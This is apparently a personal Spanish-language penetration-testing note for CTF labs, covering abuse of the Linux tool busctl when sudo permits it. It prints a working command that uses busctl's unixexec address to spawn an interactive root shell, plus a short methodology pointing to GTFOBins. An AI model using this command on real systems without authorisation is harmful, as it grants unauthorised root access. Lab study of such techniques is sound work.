# busctl

## ¿Qué es?

`busctl` es una herramienta de Linux utilizada para interactuar con D-Bus, un sistema de comunicación entre procesos presente en la mayoría de distribuciones modernas.

Desde el punto de vista ofensivo, puede utilizarse para escalar privilegios cuando el usuario tiene permiso para ejecutarlo mediante `sudo`.

---

## ¿Cuándo utilizarlo?

Cuando `sudo -l` indica que el usuario puede ejecutar `busctl` con privilegios elevados.

---

## Metodología

1. Ejecutar `sudo -l`.
2. Identificar el binario permitido.
3. Consultar GTFOBins.
4. Aplicar la técnica correspondiente.
5. Verificar la obtención de una shell privilegiada.

---

## Comandos importantes

Escalada de privilegios mediante `sudo`:

```bash
sudo busctl set-property org.freedesktop.systemd1 \
/org/freedesktop/systemd1 \
org.freedesktop.systemd1.Manager \
LogLevel s debug \
--address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

---

## Errores comunes

- No comprobar previamente los permisos mediante `sudo -l`.
- Ejecutar técnicas incompatibles con la versión del sistema.

---

## Buenas prácticas

Consultar siempre GTFOBins antes de utilizar un binario permitido por `sudo`.

---

## Laboratorios donde lo he utilizado

- JaulaCon2025 (The Hacker Labs)
